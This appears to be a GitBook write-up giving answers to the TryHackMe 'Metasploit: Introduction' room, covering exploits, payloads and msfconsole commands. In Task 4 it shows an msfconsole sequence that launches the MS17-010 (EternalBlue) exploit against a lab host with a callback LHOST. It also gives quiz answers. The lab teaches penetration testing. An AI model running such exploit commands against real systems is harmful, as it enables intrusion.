---
description: An introduction to the main components of the Metasploit Framework.
---

# Metasploit: Introduction

{% embed url="https://tryhackme.com/room/metasploitintro" %}
https://tryhackme.com/room/metasploitintro
{% endembed %}

## Task 2 Main Components of Metasploit

#### What is the name of the code taking advantage of a flaw on the target system?

{% hint style="success" %}
`exploit`
{% endhint %}

#### What is the name of the code that runs on the target system to achieve the attacker's goal?

{% hint style="success" %}
`payload`
{% endhint %}

#### What are self-contained payloads called?

{% hint style="success" %}
`singles`
{% endhint %}

#### Is "windows/x64/pingback\_reverse\_tcp" among singles or staged payload?

{% hint style="success" %}
`singles`
{% endhint %}

## Task 3 Msfconsole

#### How would you search for a module related to Apache?

{% hint style="success" %}
`search Apache`
{% endhint %}

#### Who provided the auxiliary/scanner/ssh/ssh\_login module?

```bash
msfconsole
msf > search ssh_login
msf > use 0
msf > info
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 00-11-12.png>)

{% hint style="success" %}
`todb`
{% endhint %}

## Task 4 Working with modules

```bash
msfconsole
msf > search ms17-010
msf > use 0
msf > set RHOSTS 10.10.18.172
msf > set LHOST 10.6.9.176
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2022-03-09 07-23-48.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-09 07-31-38.png>)

#### How would you set the LPORT value to 6666?

{% hint style="success" %}
`set LPORT 6666`
{% endhint %}

#### How would you set the global value for RHOSTS to 10.10.19.23 ?

{% hint style="success" %}
`setg RHOSTS 10.10.19.23`
{% endhint %}

#### What command would you use to clear a set payload?

{% hint style="success" %}
`unset payload`
{% endhint %}

#### What command do you use to proceed with the exploitation phase?

{% hint style="success" %}
`exploit`
{% endhint %}
